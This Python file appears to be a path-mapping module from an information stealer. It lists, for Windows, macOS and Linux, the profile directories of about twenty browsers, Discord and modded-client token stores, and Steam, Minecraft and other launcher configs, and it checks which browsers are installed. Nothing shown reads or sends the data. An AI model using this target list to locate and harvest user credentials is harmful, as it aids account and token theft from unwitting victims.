import os
import sys

Paths = {}
Paths["browser"] = {}
Paths["general"] = {}
Paths["general"]["discord"] = {}
Paths["games"] = {}

def generate():
  if sys.platform == "win32":
    local_appdata = os.getenv('LOCALAPPDATA')
    default_appdata = os.getenv('APPDATA')

    Paths["browser"]["chrome"] = local_appdata + \
        "\\Google\\Chrome\\User Data\\"
    Paths["browser"]["firefox"] = local_appdata + \
        "\\Mozilla\\Firefox\\Profiles\\"
    Paths["browser"]["opera"] = default_appdata + \
        "\\Opera Software\\Opera Stable\\"
    Paths["browser"]["edge"] = local_appdata + \
        "\\Microsoft\\Edge\\User Data\\"
    Paths["browser"]["brave"] = local_appdata + \
        "\\BraveSoftware\\Brave-Browser\\User Data\\"
    Paths["browser"]["vivaldi"] = local_appdata + \
        "\\Vivaldi\\User Data\\"
    Paths["browser"]["safari"] = local_appdata + "\\Apple Computer\\Safari\\"
    Paths["browser"]["tor"] = local_appdata + \
        "\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile."
    Paths["browser"]["maxthon"] = local_appdata + "\\Maxthon3\\Users\\"
    Paths["browser"]["epic"] = local_appdata + \
        "\\Epic Privacy Browser\\User Data\\"
    Paths["browser"]["avast"] = local_appdata + \
        "\\AVAST Software\\Browser\\User Data\\"
    Paths["browser"]["chromium"] = local_appdata + \
        "\\Chromium\\User Data\\"
    Paths["browser"]["comodo"] = local_appdata + \
        "\\Comodo\\Dragon\\User Data\\"
    Paths["browser"]["torch"] = local_appdata + "\\Torch\\User Data\\"
    Paths["browser"]["360"] = local_appdata + \
        "\\360Browser\\Browser\\User Data\\"
    Paths["browser"]["blisk"] = local_appdata + "\\Blisk\\User Data\\"
    Paths["browser"]["brave"] = local_appdata + \
        "\\BraveSoftware\\Brave-Browser\\User Data\\"
    Paths["browser"]["centbrowser"] = local_appdata + \
        "\\CentBrowser\\User Data\\"
    Paths["browser"]["chromium"] = local_appdata + \
        "\\Chromium\\User Data\\"
    Paths["browser"]["comodo"] = local_appdata + \
        "\\Comodo\\Dragon\\User Data\\"
    Paths["browser"]["cyberfox"] = local_appdata + \
        "\\8pecxstudios\\Cyberfox\\Profiles\\"

    Paths["general"]["discord"]["default"] = default_appdata + "\\Discord\\Local Storage\\leveldb\\"
    Paths["general"]["discord"]["discord_canary"] = default_appdata + "\\discordcanary\\Local Storage\\leveldb\\"
    Paths["general"]["discord"]["discord_ptb"] = default_appdata + "\\discordptb\\Local Storage\\leveldb\\"
    Paths["general"]["discord"]["lightcord"] = default_appdata + "\\Lightcord\\Local Storage\\leveldb\\"
    Paths["general"]["discord"]["betterdiscord"] = default_appdata + "\\BetterDiscord\\data\\betterdiscord.data\\"
    Paths["general"]["discord"]["bandagedbd"] = default_appdata + "\\BetterDiscord\\data\\bandagebd.data\\"
    Paths["general"]["discord"]["powercord"] = default_appdata + "\\Powercord\\data\\powercord.data\\"

    Paths["games"]["steam"] = default_appdata + "\\Steam\\config\\"
    Paths["games"]["minecraft"] = default_appdata + "\\.minecraft\\"
    Paths["games"]["epic"] = local_appdata + "\\EpicGamesLauncher\\Saved\\Logs\\"
    Paths["games"]["uplay"] = default_appdata + "\\Ubisoft Game Launcher\\logs\\"
    Paths["games"]["origin"] = default_appdata + "\\Origin\\Local Storage\\leveldb\\"
  elif sys.platform == "darwin":
    Paths["browser"]["chrome"] = os.path.expanduser(
        "~/Library/Application Support/Google/Chrome/")
    Paths["browser"]["firefox"] = os.path.expanduser(
        "~/Library/Application Support/Firefox/Profiles/")
    Paths["browser"]["opera"] = os.path.expanduser(
        "~/Library/Application Support/com.operasoftware.Opera/")
    Paths["browser"]["edge"] = os.path.expanduser(
        "~/Library/Application Support/Microsoft Edge/")
    Paths["browser"]["brave"] = os.path.expanduser(
        "~/Library/Application Support/BraveSoftware/Brave-Browser/")
    Paths["browser"]["vivaldi"] = os.path.expanduser(
        "~/Library/Application Support/Vivaldi/")
    Paths["browser"]["safari"] = os.path.expanduser(
        "~/Library/Safari/")
    Paths["browser"]["tor"] = os.path.expanduser(
        "~/Library/Application Support/TorBrowser-Data/Browser/profile.")
    Paths["browser"]["maxthon"] = os.path.expanduser(
        "~/Library/Application Support/Maxthon3/Users/")
    Paths["browser"]["epic"] = os.path.expanduser(
        "~/Library/Application Support/Epic Privacy Browser/")
    Paths["browser"]["avast"] = os.path.expanduser(
        "~/Library/Application Support/AVAST Software/Browser/")
    Paths["browser"]["chromium"] = os.path.expanduser(
        "~/Library/Application Support/Chromium/")
    Paths["browser"]["comodo"] = os.path.expanduser(
        "~/Library/Application Support/Comodo/Dragon/")
    Paths["browser"]["torch"] = os.path.expanduser(
        "~/Library/Application Support/Torch/")
    Paths["browser"]["360"] = os.path.expanduser(
        "~/Library/Application Support/360Browser/Browser/")
    Paths["browser"]["blisk"] = os.path.expanduser(
        "~/Library/Application Support/Blisk/")
    Paths["browser"]["brave"] = os.path.expanduser(
        "~/Library/Application Support/BraveSoftware/Brave-Browser/")
    Paths["browser"]["centbrowser"] = os.path.expanduser(
        "~/Library/Application Support/CentBrowser/")
    Paths["browser"]["chromium"] = os.path.expanduser(
        "~/Library/Application Support/Chromium/")
    Paths["browser"]["comodo"] = os.path.expanduser(
        "~/Library/Application Support/Comodo/Dragon/")
    Paths["browser"]["cyberfox"] = os.path.expanduser(
        "~/Library/Application Support/8pecxstudios/Cyberfox/Profiles/")
  elif sys.platform == "linux":
    Paths["browser"]["chrome"] = os.path.expanduser("~/.config/google-chrome/")
    Paths["browser"]["firefox"] = os.path.expanduser("~/.mozilla/firefox/")
    Paths["browser"]["opera"] = os.path.expanduser("~/.config/opera/")
    Paths["browser"]["edge"] = os.path.expanduser("~/.config/microsoft-edge/")
    Paths["browser"]["brave"] = os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/")
    Paths["browser"]["vivaldi"] = os.path.expanduser("~/.config/vivaldi/")
    Paths["browser"]["safari"] = os.path.expanduser("~/.config/safari/")
    Paths["browser"]["tor"] = os.path.expanduser("~/.config/tor-browser/")
    Paths["browser"]["maxthon"] = os.path.expanduser("~/.config/maxthon3/")
    Paths["browser"]["epic"] = os.path.expanduser("~/.config/epic-privacy-browser/")
    Paths["browser"]["avast"] = os.path.expanduser("~/.config/avast-software/browser/")
    Paths["browser"]["chromium"] = os.path.expanduser("~/.config/chromium/")
    Paths["browser"]["comodo"] = os.path.expanduser("~/.config/comodo/dragon/")
    Paths["browser"]["torch"] = os.path.expanduser("~/.config/torch/")
    Paths["browser"]["360"] = os.path.expanduser("~/.config/360browser/browser/")
    Paths["browser"]["blisk"] = os.path.expanduser("~/.config/blisk/")
    Paths["browser"]["brave"] = os.path.expanduser("~/.config/bravesoftware/brave-browser/")
    Paths["browser"]["centbrowser"] = os.path.expanduser("~/.config/centbrowser/")
    Paths["browser"]["chromium"] = os.path.expanduser("~/.config/chromium/")
    Paths["browser"]["comodo"] = os.path.expanduser("~/.config/comodo/dragon/")
    Paths["browser"]["cyberfox"] = os.path.expanduser("~/.config/8pecxstudios/cyberfox/profiles/")

def get_installed_browsers():
  browsers = []
  for browser in Paths["browser"]:
    if os.path.exists(Paths["browser"][browser]):
      browsers.append(browser)
  return browsers

generate()
